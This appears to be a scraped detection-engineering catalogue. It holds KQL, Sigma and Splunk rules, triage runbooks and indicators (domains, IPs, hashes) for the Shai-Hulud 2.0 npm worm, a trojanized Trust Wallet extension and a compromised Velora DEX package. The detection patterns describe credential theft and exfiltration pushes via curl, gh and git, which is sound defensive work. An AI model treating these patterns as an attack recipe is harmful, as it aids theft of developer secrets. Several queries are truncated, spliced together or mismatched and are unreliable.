Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Shai-Hulud 2.0 npm worm artifact: setup_bun.js / bun_environment.js dropped by node/npm · Suspicious browser extension installation · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Trust Wallet Shai-Hulud C2 callback to metrics-trustwallet.com / 138.124.70.40 · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Shai-Hulud preinstall: node/npm spawning git/curl/gh pushing to attacker repo or GitHub API · Infostealer — non-browser process accessing browser cookie/login DBs · Remote service execution — PsExec / SMB lateral movement
Trust Wallet Shai-Hulud C2 callback to metrics-trustwallet.com / 138.124.70.40 AICommand & Control High
Detects network or DNS activity to the attacker-controlled exfil/C2 infrastructure used by the trojanized Trust Wallet browser extension v2.68 and the Shai-Hulud 2.0 worm. The domain pair was staged on Stark Industries (AS44477) on 2025-12-08 and used to harvest wallet mnemonics and developer secrets from compromised endpoints. Rationale: Domain pair metrics-trustwallet.com / api.metrics-trustwallet.com and resolving IP 138.124.70.40 (Stark Industries AS44477) are confirmed across Trust Wallet's incident update, The Hacker News, Halborn, BleepingComputer and Cybernews writeups as exclusive attacker infrastructure with no legitimate use. Hash-grade fidelity. Cross-checked against: • https://thehackernews.com/2025/12/trust-wallet-chrome-extension-hack.html • https://trustwallet.com/blog/announcements/trust-wallet-browser-extension-v268-incident-community-update • https://www.bleepingcomputer.com/news/security/trust-wallet-links-85-million-crypto-theft-to-shai-hulud-npm-attack/ • https://www.halborn.com/blog/post/explained-the-trust-wallet-hack-december-2025 • https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/
ATT&CKT1071.001 T1041
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researchers detonating the Trust Wallet extension sample inside a corp sandbox
  • TI feed validation pulls of the IOC list from a SOAR host
  • Legitimate Trust Wallet users on developer endpoints (note: metrics-trustwallet.com is NOT a Trust Wallet domain, so this is rare)
  • Threat hunting team curl/wget against the IOC for confirmation
Suppression filter
| where not (DeviceName in ("SANDBOX-01","TI-RESEARCH-01") or InitiatingProcessFileName in~ ("thor.exe","yara.exe"))
Response runbook
1) TRIAGE: pull the initiating process, parent, and account from the network event - if it's chrome.exe / msedge.exe with the user's profile loading the Trust Wallet extension ID, treat as confirmed compromise; if it's a hunter/sandbox host on the allowlist, document and close. 2) CONTAIN: isolate the device via Defender/CrowdStrike network isolation; force-revoke the user's GitHub PAT, npm token, ~/.aws, ~/.npmrc, gh CLI tokens, SSH keys, and Chrome Web Store API key; rotate all browser-stored wallet seeds. 3) HUNT: search DeviceFileEvents for setup_bun.js / bun_environment.js writes by node/npm on the same host (UC #2), query GitHub audit logs for new repo creation by the user matching name pattern [0-9a-z]{18}, and pivot across the org for any other host that resolved metrics-trustwallet.com in the last 60d.
let badDomains = dynamic(["metrics-trustwallet.com","api.metrics-trustwallet.com"]);
let badIPs = dynamic(["138.124.70.40"]);
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any (badDomains) or RemoteIP in (badIPs)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, ActionType
| order by Timestamp desc
let badDomains = dynamic(["metrics-trustwallet.com","api.metrics-trustwallet.com"]);
let badIPs = dynamic(["138.124.70.40"]);
union isfuzzy=true
  (ImDnsActivity
   | where TimeGenerated > ago(30d)
   | where DnsQuery has_any (badDomains)
   | project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, DnsQuery, DnsResponseName, EventProduct),
  (ImNetworkSession
   | where TimeGenerated > ago(30d)
   | where DstIpAddr in (badIPs) or DstHostname has_any (badDomains)
   | project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, DstIpAddr, DstPortNumber, Url, EventProduct),
  (CommonSecurityLog
   | where TimeGenerated > ago(30d)
   | where DestinationHostName has_any (badDomains) or DestinationIP in (badIPs) or RequestURL has_any (badDomains)
   | project TimeGenerated, SourceHostName, SourceIP, DestinationHostName, DestinationIP, RequestURL, DeviceVendor, DeviceProduct)
| order by TimeGenerated desc
title: Trust Wallet Shai-Hulud C2 Network Callback
id: 7a4f2d5e-1c8e-4f1a-9b2c-3e8a2d7b9c01
description: Detects DNS or network connections to attacker infrastructure used by the trojanized Trust Wallet extension v2.68 and Shai-Hulud 2.0 worm.
references:
  - https://thehackernews.com/2025/12/trust-wallet-chrome-extension-hack.html
  - https://trustwallet.com/blog/announcements/trust-wallet-browser-extension-v268-incident-community-update
  - https://www.stepsecurity.io/blog/securing-vibe-coding-and-ai-coding-agents-an-end-to-end-approach-with-stepsecurity
author: SOC Detection Engineering
date: 2026/05/19
tags:

logsource:
  category: dns
detection:
  selection_domain:
    query|contains:
      - 'metrics-trustwallet.com'
  selection_ip:
    answer:
      - '138.124.70.40'
  condition: selection_domain or selection_ip
falsepositives:
  - Threat-intel researchers retrieving samples
  - EDR sandbox replay of captured malicious extension
level: high
(source:(windows.sysmon OR windows.defender) AND @EventID:(22 OR 3) AND (@QueryName:(metrics-trustwallet.com OR api.metrics-trustwallet.com) OR @DestinationHostname:(metrics-trustwallet.com OR api.metrics-trustwallet.com) OR @DestinationIp:138.124.70.40)) OR (source:cloudtrail AND @network.client.ip:138.124.70.40)
(#event_simpleName=DnsRequest DomainName=/^(api\.)?metrics-trustwallet\.com$/i) OR (#event_simpleName=/^NetworkConnectIP[46]$/ RemoteAddressIP4="138.124.70.40")
| groupBy([aid, ComputerName, ContextImageFileName, DomainName, RemoteAddressIP4], function=[count(), min(@timestamp, as=firstSeen), max(@timestamp, as=lastSeen)])

| `drop_dm_object_name(DNS)`

   | `drop_dm_object_name(All_Traffic)`]
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime

Shai-Hulud 2.0 npm worm artifact: setup_bun.js / bun_environment.js dropped by node/npm AIInstallation High
Detects the two malicious payload files written to disk by the Shai-Hulud 2.0 npm worm via a poisoned preinstall script. bun_environment.js is a ~10MB heavily-obfuscated harvester; setup_bun.js is the bootstrap. Both are written by node.exe / npm under a developer's home or repo path during package install. Rationale: Files setup_bun.js and bun_environment.js are documented across Datadog Security Labs, Microsoft, Unit 42, Sysdig, Netskope, Wiz and Trend Micro as the canonical Shai-Hulud 2.0 worm artifacts dropped by the malicious npm preinstall script. The ~10MB obfuscated bun_environment.js is unique to this campaign - filename + node/npm parent is hash-grade. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/ • https://www.sysdig.com/blog/return-of-the-shai-hulud-worm-affects-over-25-000-github-repositories • https://github.com/DataDog/indicators-of-compromise/tree/main/shai-hulud-2.0
ATT&CKT1195.002 T1059.007 T1546.016
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Bun runtime tooling internally referencing the name 'bun_environment' in an unrelated file (extremely rare - the worm specifically chose this name to blend with the bun.sh ecosystem)
  • Security researcher unpacking a Shai-Hulud sample on a non-sandbox dev host
  • DFIR analyst replaying a captured Shai-Hulud archive in a forensic VM
  • Repo containing legitimate test fixture named setup_bun.js by a Shai-Hulud researcher
Suppression filter
| where not (FolderPath has_any (@"\TI-Research\",@"\Sandbox\",@"\Detonation\") or DeviceName startswith "SANDBOX-")
Response runbook
1) TRIAGE: capture the InitiatingProcessCommandLine - if it shows `npm install <pkg>@<ver>` from a poisoned package, hash bun_environment.js and compare to known SHA256s (46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09 et al). Pull the package.json from the install target and inspect the preinstall hook. 2) CONTAIN: kill the node.exe tree; quarantine both .js files; revoke ALL developer secrets on the host - GitHub PAT/SSH/gh-cli, npm tokens (npm token revoke), AWS keys, GCP service-account JSON, Azure az CLI tokens, .docker/config.json. Force-rotate the npm publish token org-wide if the user has publish rights. 3) HUNT: pivot DeviceProcessEvents for node.exe spawning curl/git/gh within 5 min of the file write (UC #3); query GitHub audit for repos created by the developer matching regex `^[0-9a-z]{18}$`; review npm publish history for the user's packages in the last 7 days for unauthorized versions.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FileName in~ ("setup_bun.js","bun_environment.js")
| where InitiatingProcessFileName in~ ("node.exe","npm.cmd","npm.exe","npx.cmd","yarn.exe","yarn.cmd","pnpm.exe","pnpm.cmd","bun.exe","sh.exe","bash.exe")
   or FolderPath has_any (@"\node_modules\",@"\.npm\",@"\AppData\Local\npm\",@"\AppData\Roaming\npm\")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FileName, FolderPath, SHA256, FileSize
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified")
| where TargetFileName in~ ("setup_bun.js","bun_environment.js")
| where ActingProcessName has_any ("node.exe","npm.cmd","npm.exe","yarn.exe","pnpm.exe","bun.exe","sh","bash")
   or TargetFilePath has_any ("\\node_modules\\","/node_modules/","\\.npm\\","/.npm/")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFileName, TargetFilePath, TargetFileSize, TargetFileSHA256
| order by TimeGenerated desc
title: Shai-Hulud 2.0 npm Worm Payload File Drop
id: c1d8e9a7-5b32-4d6e-8c1f-9d3a2b7e4c12
description: Detects creation of Shai-Hulud 2.0 worm artifacts setup_bun.js and bun_environment.js, dropped by a malicious npm preinstall script during package installation.
references:
  - https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
  - https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
  - https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/
  - https://www.sysdig.com/blog/return-of-the-shai-hulud-worm-affects-over-25-000-github-repositories
  - https://www.stepsecurity.io/blog/securing-vibe-coding-and-ai-coding-agents-an-end-to-end-approach-with-stepsecurity
author: SOC Detection Engineering
date: 2026/05/19
tags:
  - attack.initial_access
  - attack.t1195.002
  - attack.execution
  - attack.t1059.007
logsource:
  category: file_event
  product: windows
detection:
  selection_file:
    TargetFilename|endswith:
      - '\setup_bun.js'
      - '\bun_environment.js'
      - '/setup_bun.js'
      - '/bun_environment.js'
  selection_writer:
    Image|endswith:
      - '\node.exe'
      - '\npm.cmd'
      - '\npm.exe'
      - '\npx.cmd'
      - '\yarn.exe'
      - '\yarn.cmd'
      - '\pnpm.exe'
      - '\bun.exe'
      - '\sh.exe'
      - '\bash.exe'
  condition: selection_file and selection_writer
falsepositives:
  - Developer manually authoring a file literally named bun_environment.js (rare)
  - Bun runtime installer (writes to %LOCALAPPDATA%\bun, not into node_modules)
level: high
source:windows.sysmon @EventID:11 @TargetFilename:(*\\setup_bun.js OR *\\bun_environment.js OR */setup_bun.js OR */bun_environment.js) @Image:(*\\node.exe OR *\\npm.cmd OR *\\npm.exe OR *\\yarn.exe OR *\\pnpm.exe OR *\\bun.exe OR *\\sh.exe OR *\\bash.exe OR *\\NODE.EXE OR *\\NPM.EXE)
#event_simpleName=FileWritten TargetFileName=/(\\|\/)(setup_bun|bun_environment)\.js$/i
| ContextImageFileName=/(\\|\/)(node|npm|npx|yarn|pnpm|bun|sh|bash)(\.exe|\.cmd)?$/i
| groupBy([aid, ComputerName, UserName, ContextImageFileName, TargetFileName], function=[count(), min(@timestamp, as=firstWrite), max(WrittenBytes, as=maxBytes)])
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as paths values(Filesystem.process_name) as writers from datamodel=Endpoint.Filesystem where Filesystem.file_name IN ("setup_bun.js","bun_environment.js") by Filesystem.dest Filesystem.user Filesystem.file_name
| `drop_dm_object_name(Filesystem)`
| where match(writers, "(?i)(node|npm|yarn|pnpm|bun)\\.(exe|cmd)?") OR match(paths, "(?i)node_modules|npm-cache|\\\\AppData\\\\Local\\\\npm")
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as paths values(Filesystem.process_name) as writers from datamodel=Endpoint.Filesystem where Filesystem.file_name IN ("setup_bun.js","bun_environment.js") by Filesystem.dest Filesystem.user Filesystem.file_name
| `drop_dm_object_name(Filesystem)`
| where match(writers, "(?i)(node|npm|yarn|pnpm|bun)\\.(exe|cmd)?") OR match(paths, "(?i)node_modules|npm-cache|\\\\AppData\\\\Local\\\\npm")
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime
Shai-Hulud preinstall: node/npm spawning git/curl/gh pushing to attacker repo or GitHub API AIActions on Objectives Medium
Hunts for the Shai-Hulud 2.0 self-propagation/exfil step where the dropped bun_environment.js forks a detached node process that uses git, gh, or curl to create a public GitHub repo (name matching [0-9a-z]{18}) tagged 'Sha1-Hulud: The Second Coming' and push the harvested credentials. Pivots on the parent=node.exe/npm child=git/curl/gh chain that's atypical of normal install flows. Rationale: Self-propagation step is documented by Datadog Security Labs and Microsoft - the worm uses victim npm/GitHub tokens to create [0-9a-z]{18}-named public repos with description 'Sha1-Hulud: The Second Coming' and pushes harvested credentials. Pivot on the unusual parent=node child=git/gh/curl chain combined with credential-file path tokens in cmdline. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/ • https://www.netskope.com/blog/shai-hulud-2-0-aggressive-automated-one-of-fastest-spreading-npm-supply-chain-attacks-ever-observed • https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
ATT&CKT1567 T1059.007 T1078.004 T1552.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legit npm packages with postinstall hooks that invoke git (e.g. nodegit, husky setup) - filter on cmdline tokens to suppress
  • CI runners doing `npm publish` flows that internally call gh CLI
  • Developer running `npx create-react-app` which spawns git init
  • DevOps tooling like semantic-release that pushes tags from a node parent
  • AI coding agent (Claude Code, Cursor) running `git add/commit` from a node MCP server
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("husky","semantic-release","create-react-app","@nestjs/cli") and not ProcessCommandLine has_any ("Sha1-Hulud","bun_environment",".aws/credentials","id_rsa"))
Response runbook
1) TRIAGE: confirm the cmdline contains a credential-path token (.aws/credentials, .npmrc, id_rsa) or GitHub API repo-create call - benign FPs almost never combine these. Pull the node parent's loaded modules / open file handles for bun_environment.js. 2) CONTAIN: immediately revoke the developer's GitHub PAT, gh CLI auth (gh auth logout), npm token (npm token revoke), and rotate AWS/GCP/Azure CLI creds; check api.github.com audit log for repos created by this user in the last 24h matching ^[0-9a-z]{18}$ and request GitHub takedown. 3) HUNT: search the org for ANY node.exe parent spawning gh/git with 'api.github.com' or 'Sha1-Hulud' tokens; verify no malicious version was published from this developer's npm packages in the last 72h; flag the originating npm package and pull it from internal mirrors.
let pkgMgrs = dynamic(["node.exe","npm.cmd","npm.exe","npx.cmd","yarn.exe","yarn.cmd","pnpm.exe","bun.exe"]);
DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ (pkgMgrs)
| where FileName in~ ("git.exe","curl.exe","gh.exe","node.exe","powershell.exe","pwsh.exe")
| where ProcessCommandLine has_any ("api.github.com/user/repos","Sha1-Hulud","Shai-Hulud","The Second Coming","bun_environment","setup_bun","--detach",".aws/credentials",".npmrc","id_rsa",".ssh/","GH_TOKEN","NPM_TOKEN")
   or InitiatingProcessCommandLine has_any ("bun_environment.js","setup_bun.js","--detach")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
let pkgMgrs = dynamic(["node.exe","npm.cmd","npm.exe","npx.cmd","yarn.exe","pnpm.exe","bun.exe"]);
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ParentProcessName has_any (pkgMgrs)
| where TargetProcessName has_any ("git.exe","curl.exe","gh.exe","node.exe","powershell.exe","pwsh.exe")
| where TargetProcessCommandLine has_any ("api.github.com/user/repos","Sha1-Hulud","Shai-Hulud","The Second Coming","bun_environment","setup_bun","--detach",".aws/credentials",".npmrc","id_rsa",".ssh/","GH_TOKEN","NPM_TOKEN")
   or ParentProcessCommandLine has_any ("bun_environment.js","setup_bun.js","--detach")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc
source:windows.sysmon @EventID:1 @ParentImage:(*\\node.exe OR *\\NODE.EXE OR *\\npm.exe OR *\\npm.cmd OR *\\yarn.exe OR *\\pnpm.exe OR *\\bun.exe) @Image:(*\\git.exe OR *\\GIT.EXE OR *\\curl.exe OR *\\gh.exe OR *\\node.exe OR *\\powershell.exe) @CommandLine:(*api.github.com/user/repos* OR *Sha1-Hulud* OR *Shai-Hulud* OR *"The Second Coming"* OR *bun_environment* OR *setup_bun* OR *.aws/credentials* OR *.npmrc* OR *id_rsa* OR *GH_TOKEN* OR *NPM_TOKEN*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(node|npm|npx|yarn|pnpm|bun)\.(exe|cmd)$/i ImageFileName=/(\\|\/)(git|curl|gh|node|powershell|pwsh)\.exe$/i
| regex("(?i)(api\\.github\\.com/user/repos|Sha1-Hulud|Shai-Hulud|The Second Coming|bun_environment|setup_bun|--detach|\\.aws/credentials|\\.npmrc|id_rsa|\\.ssh/|GH_TOKEN|NPM_TOKEN)", field=CommandLine)
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmds from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("node.exe","npm.cmd","npm.exe","npx.cmd","yarn.exe","pnpm.exe","bun.exe") AND Processes.process_name IN ("git.exe","curl.exe","gh.exe","node.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
| `drop_dm_object_name(Processes)`
| where match(cmds, "(?i)(api\\.github\\.com|/user/repos|Sha1-Hulud|Shai-Hulud|--detach|bun_environment|setup_bun|aws/credentials|\\.npmrc|id_rsa|/.ssh/)")
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmds from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("node.exe","npm.cmd","npm.exe","npx.cmd","yarn.exe","pnpm.exe","bun.exe") AND Processes.process_name IN ("git.exe","curl.exe","gh.exe","node.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
| `drop_dm_object_name(Processes)`
| where match(cmds, "(?i)(api\\.github\\.com|/user/repos|Sha1-Hulud|Shai-Hulud|--detach|bun_environment|setup_bun|aws/credentials|\\.npmrc|id_rsa|/.ssh/)")
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime
Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.
ATT&CKT1176
Data sourcesEndpoint.Registry DeviceRegistryEvents
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where RegistryKey has_any ("\Software\Google\Chrome\Extensions\","\Software\Microsoft\Edge\Extensions\","\Software\Mozilla\Firefox\Extensions\")
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessAccountName
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where RegistryKey has_any (@"\Software\Google\Chrome\Extensions\",
                              @"\Software\Microsoft\Edge\Extensions\",
                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

title: Browser Extension Installation via Registry
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0a
status: experimental
description: |
    Registry writes under the browser extension policy keys —
    administrative install of an extension. Often used by adware /
    info-stealers to bypass user-level extension controls.
references:
    - https://attack.mitre.org/techniques/T1176/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1176
    - attack.persistence
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:

        | where InitiatingProcessAccountName !endswith "$"

        | where SHA256 in~ ("46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09", "b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777", "dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c", "4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db", "62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0", "f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068", "cbb9bc5a8496243e02f3cc080efbe3e4a1430ba0671f2e43a202bf45b05479cd", "a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a") or SHA1 in~ ("46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09", "b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777", "dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c", "4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db", "62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0", "f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068", "cbb9bc5a8496243e02f3cc080efbe3e4a1430ba0671f2e43a202bf45b05479cd", "a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a") or MD5 in~ ("46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09", "b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777", "dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c", "4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db", "62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0", "f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068", "cbb9bc5a8496243e02f3cc080efbe3e4a1430ba0671f2e43a202bf45b05479cd", "a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a")

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09", "b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777", "dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c", "4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db", "62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0", "f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068", "cbb9bc5a8496243e02f3cc080efbe3e4a1430ba0671f2e43a202bf45b05479cd", "a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Snyk
2026-04-10 1 use case 2 techniques 3 kill-chain phases detected

AI can find vulnerabilities at scale, but enterprise security now depends on control, validation, and governance that can keep up.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

@velora-dex/sdk Compromised on npm: Malicious Version Drops macOS Backdoor via launchctl Persistence

StepSecurity
2026-04-09 8 use cases 2 techniques 5 kill-chain phases detected

A registry-only supply chain attack on @velora-dex/sdk delivers an architecture-aware macOS backdoor that fires the moment your code imports the package. No install hooks, no repo commits, no visible output.

Outbound connection to Velora DEX npm supply-chain C2 89.36.224.5 AICommand & Control High
Detect any host beaconing to the @velora-dex/sdk@9.4.1 dropper IP 89.36.224.5 over plaintext HTTP. The address serves install.sh and the architecture-specific profiler binaries; any direct contact from a developer workstation, build agent or CI runner is a compromise indicator. Rationale: 89.36.224.5 is the unique C2 address explicitly named in the StepSecurity write-up (table: 'Network Events: C2 Contact Confirmed' and the three IOC URLs at the end). Cross-checked against the original Aikido GitHub issue #233 reference and the article body. A single IP IOC with no legitimate business reason on any endpoint makes this a very high-fidelity alert. Cross-checked against: • https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence • https://github.com/paraswap/paraswap-sdk/issues/233
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher detonating the sample in a lab connected to corporate telemetry
  • Threat-intel platform actively probing the IOC for enrichment
  • Internal sandbox VM ingesting the malicious tarball for analysis
  • Red-team replicating the attack chain as part of a purple-team exercise
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsSenseS.exe","SenseIR.exe")  // exclude Defender sandbox detonations
Response runbook
